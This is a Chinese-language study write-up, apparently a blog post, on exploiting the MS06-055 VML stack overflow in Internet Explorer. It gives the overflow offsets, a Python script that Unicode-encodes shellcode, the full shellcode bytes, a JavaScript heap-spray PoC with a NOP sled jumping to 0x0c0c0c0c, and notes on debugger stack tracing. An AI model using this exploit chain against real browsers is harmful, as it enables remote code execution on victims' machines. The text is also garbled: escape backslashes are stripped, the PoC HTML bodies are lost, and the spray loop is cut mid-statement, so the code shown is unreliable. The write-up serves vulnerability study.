找到我们的vml_test.html中的参数，增加method标签中Q的数量。再次进行调试
观察缓冲区我们填充的Q被存放在了缓冲区中，但是格式思路和我们期望的似乎有些不同。
在两个字符之间多处了x00的编码。原因是在VML在解析我们数据的时候使用的是UNICODE编码，而不是ASCII码，所以Q的ASCII码表示为x51而在UNICODE下则会转化为x00x51，格式为u0051
_IE5_SHADETYPE_TEXT::TOKENS::Ptok函数的EBP为0x12C0D0，所以函数的返回地址位于0x12C0D4，当然调试器也已经帮我标记好了这个地址。
而我们知道之前的缓冲区首地址为0x12BECC，所以我们需要在缓冲区填充0x20c的字节的才能覆盖返回地址。(也就是说0x106个Q)
我们编写POC.html,然后使用当前被调试的IE浏览器访问poc.html
观察此时的栈空间，返回地址已经被覆盖。
显然，只能控制一半的字节是无法完成利用的（当然可以用unescape来输入ascii而不是unicode），在二进制格式中输入ascii（x12）和unicode(u1234)的区别我们已经知道。我们需要在method参数中输入unicode编码，需要遵循这种格式
ሴ
例如如下的参数，在内存中会这样显示
    !
如此构建payload #python -c “print ‘&#x0c0c’*0x106”
不过调试过程出现报错，因为MOV DS:[EAX],EBX (EAX=0x0c0c0c0c)向一个不可写的位置写数据。
抓住罪魁祸首，这句话读取EBP-4位置的数据（位于下图中0x12ccc的位置），存入EAX。
话说EBP-4这个位置让我打了一个寒颤，难道这个DLL开了StackCookie？
不过找到了EAX数据的来源，那我们就将其改为一个可以读取的地址（内存中被标为W的都行，例如0x0012011）。（可以直接用调试器修改寄存器的值）
poc.html
    migraine
到目前位置栈溢出漏洞的利用已经告一段落,上文已经给出我们的poc，接下来就到了本部分的重头戏—Heap Spray.
###  2.1.5 堆喷射利用
1.对shellcode编码
首先我们将shellcode编码为unicode，因为javascript只读取unicode格式。我们在这里可以使用python对shellcode进行编码。直接贴上脚本。
    #!/usr/bin/python
    shellcode="xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"
    shellcode+="x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"
    shellcode+="x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"
    shellcode+="x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"
    shellcode+="xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"
    shellcode+="x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"
    shellcode+="xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"
    shellcode+="xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"
    shellcode+="x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"
    shellcode+="x53x68x61x69x6Ex65x68x6Dx69x67x72x8BxC4x53x50x50"
    shellcode+="x53xFFx57xFCx53xFFx57xF8"
    print "shellcode(Unicode)=",
    for i in range(0,len(shellcode),2):
    ​        unicode_right=shellcode[i]
    ​        unicode_left=shellcode[i+1]
    ​        unicode=unicode_left+unicode_right
    ​        print "b\u"+unicode.encode('hex'),
脚本编写方面的笔记
1.Python 2如果要print不换行只需要加一个逗号，但是逗号需要产生一个空格，可以用/b去除。
2.str类型的要输出hex，需要使用encode函数。
输出的shellcode
    "u68fcu0a6au1e38u6368ud189u684fu7432u0c91uf48bu7e8du33f4ub7dbu2b04u66e3u33bbu5332u7568u6573u5472ud233u8b64u305au4b8bu8b0cu1c49u098bu698buad08u6a3du380au751eu9505u57ffu95f8u8b60u3c45u4c8bu7805ucd03u598bu0320u33ddu47ffu348bu03bbu99f5ube0fu3a06u74c4uc108u07caud003ueb46u3bf1u2454u751cu8be4u2459udd03u8b66u7b3cu598bu031cu03ddubb2cu5f95u57abu3d61u0a6au1e38ua975udb33u6853u6961u656eu6d68u6769u8b72u53c4u5050uff53ufc57uff53uf857"
2.通过javascript产生堆空间
Javascript申请的堆空间会从0x00000000向内存高地址分配
如果申请200MB（0x0C800000）的内存一定会将0x0c0c0c0c覆盖。
完整的poc.html
    migraine
    var shellcode="u68fcu0a6au1e38u6368ud189u684fu7432u0c91uf48bu7e8du33f4ub7dbu2b04u66e3u33bbu5332u7568u6573u5472ud233u8b64u305au4b8bu8b0cu1c49u098bu698buad08u6a3du380au751eu9505u57ffu95f8u8b60u3c45u4c8bu7805ucd03u598bu0320u33ddu47ffu348bu03bbu99f5ube0fu3a06u74c4uc108u07caud003ueb46u3bf1u2454u751cu8be4u2459udd03u8b66u7b3cu598bu031cu03ddubb2cu5f95u57abu3d61u0a6au1e38ua975udb33u6853u6961u656eu6d68u6769u8b72u53c4u5050uff53ufc57uff53uf857";
    var nop="u9090u9090";
    while(nop.length
程序跳转到0x0c0c0c0c之后一路滑行，直到滑到下一个1MB的内存空间，执行shellcode。
###  2.1.6回顾漏洞挖掘过程
问：在没有符号表的情况下，我们是如何判断程序的漏洞点的。
其实这个漏洞在挖掘上存在一个巧合，填充大量的Q值，发现程序的EIP并没有跳转到0x51515151，但是程序却非常巧合地断在了漏洞函数中。但是程序并没有触发这个漏洞。
不过就凭这一点，要做后期分析也是非常方便的。
不过我们并不恩感每次漏洞挖掘都期待存在这种巧合。
栈回溯技术
我们使用poc中的method参数，假设这是模拟我们在模糊测试中的测试场景，最终会导致EIP跳转。
当Fuzz时，程序发生崩溃。但是当EIP跳转之后，程序会继续运行，然后最终断在某个程序错误中，所以我们很难判断造成程序崩溃的具体函数。
那有没有解决方案呢，我们在这里可以使用栈回溯技术，追踪漏洞的源头。
在运行poc之前首先点击Open or clear run trace，打开栈追踪，然后点击Trace into
等到触发崩溃之后，进入栈追踪的窗口（将调试窗口缩小就能看到了，或者点击View-Call Stack）
发现成功追溯到vgx.5AD02D1B,也就是我们产生漏洞的函数。
## 小结
结束了堆喷射的学习，目前就把Win下（IE）漏洞的预备知识都复习了一遍了，接下里来学习就要进入快车道了，接下来将重返UAF漏洞的学习，同时寻找好的案例进行解析和Fuzz学习。
## 参考文献：
[1]
[0x3E6](https://me.csdn.net/qq_31922231).MS06-055（CVE-2006-4868）漏洞分析[DB/OL].
[2]0Day安全:软件漏洞分析技术
[3]magictong.Heap Spray原理浅析[DB.OL].
[4][Yuri800](https://me.csdn.net/lixiangminghate).演示Heap Spray(堆喷射)的原理[DB/OL].
[5][噗咚Four](https://bbs.pediy.com/user-833287.htm)
.[原创]初识堆喷射及事例(暴雷漏洞)分析[DB/OL].
[6] [lostspeed](https://me.csdn.net/LostSpeed).OD用栈回溯法找程序流程点[DB/OL].
[7] [行之](https://xz.aliyun.com/u/8391).JavaScript中的堆漏洞利用[DB/OL].